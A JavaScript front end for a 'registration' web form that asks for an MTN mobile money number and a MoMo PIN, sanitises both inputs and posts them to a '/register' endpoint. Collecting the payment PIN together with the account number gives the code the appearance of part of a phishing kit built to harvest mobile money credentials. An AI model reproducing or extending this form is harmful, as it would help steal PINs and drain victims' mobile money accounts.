document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('registrationForm');
    const messageContainer = document.getElementById('messageContainer');
    const submitBtn = document.getElementById('submitBtn');
    const mtnInput = document.getElementById('mtnNumber');
    const pinInput = document.getElementById('momoPin');

    // Input sanitization
    mtnInput.addEventListener('input', () => {
        mtnInput.value = mtnInput.value.replace(/[^\d\s\+]/g, '');
    });

    pinInput.addEventListener('input', () => {
        pinInput.value = pinInput.value.replace(/\D/g, '').slice(0, 4);
    });

    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        submitBtn.disabled = true;
        submitBtn.textContent = 'REGISTERING...';
        hideMessage();

        const formData = new FormData(form);

        try {
            const response = await fetch('/register', {
                method: 'POST',
                body: formData
            });

            const data = await response.json();

            if (data.success) {
                showMessage(data.message || 'Registration successful!', 'success');
                form.reset();
            } else {
                showMessage(data.message || 'Registration failed.', 'error');
            }
        } catch (error) {
            showMessage('Network error. Please try again.', 'error');
        } finally {
            submitBtn.disabled = false;
            submitBtn.textContent = 'REGISTER';
        }
    });
});

function showMessage(msg, type) {
    const container = document.getElementById('messageContainer');
    container.textContent = msg;
    container.className = `message-container ${type}`;
    container.style.display = 'block';
}

function hideMessage() {
    const container = document.getElementById('messageContainer');
    container.style.display = 'none';
}

function togglePinVisibility() {
    const pin = document.getElementById('momoPin');
    const toggle = document.querySelector('.toggle-pin');
    
    if (pin.type === 'password') {
        pin.type = 'text';
        toggle.textContent = '🙈';
    } else {
        pin.type = 'password';
        toggle.textContent = '👁️';
    }
}